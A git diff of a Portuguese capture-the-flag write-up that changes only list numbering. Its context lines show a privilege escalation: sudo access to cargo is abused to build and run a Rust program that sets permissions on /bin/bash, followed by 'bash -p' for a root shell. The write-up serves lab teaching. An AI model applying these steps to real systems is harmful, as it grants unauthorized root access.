@@ -348,7 +348,7 @@ Com a shell do usuário astrid, executamos `sudo -l` e identificamos que ele pos
 
 ![Sudo](/images/hackingclub-extract/file-extract-2025-12.png)
 
-1.      Criação do projeto Rust. 
+1 - Criação do projeto Rust. 
 
 ```bash
 mkdir privesc ; nano /privesc/Cargo.toml
@@ -367,7 +367,7 @@ edition = "2018"
 - `Cargo.toml` define as metainformações do pacote, como: nome do projeto, versão, edição da linguagem Rust.
 - Esse arquivo é essencial para que o cargo consiga compilar o projeto.
 
-2.      Criação do arquivo-fonte principal.
+2 - Criação do arquivo-fonte principal.
 
 ```bash
 mkdir privesc/src ; nano /privesc/src/main.rs
@@ -392,13 +392,13 @@ fn main(){
 - Chama `chmod` com argumentos para alterar permissões do `/bin/bash`.
 - `spawn()` inicia o processo e `unwrap()` faz o programa encerrar com erro caso a execução falhe.
 
-3.      Executar o script em Rust.
+3 - Executar o script em Rust.
 
 ```bash
 cd privesc ; sudo /root/.cargo/bin/cargo run
 ```
 
-4.      Executar o /bin/bash em modo preservado(Privilege Mode).
+4 - Executar o /bin/bash em modo preservado(Privilege Mode).
 
 ```bash
 /bin/bash -p
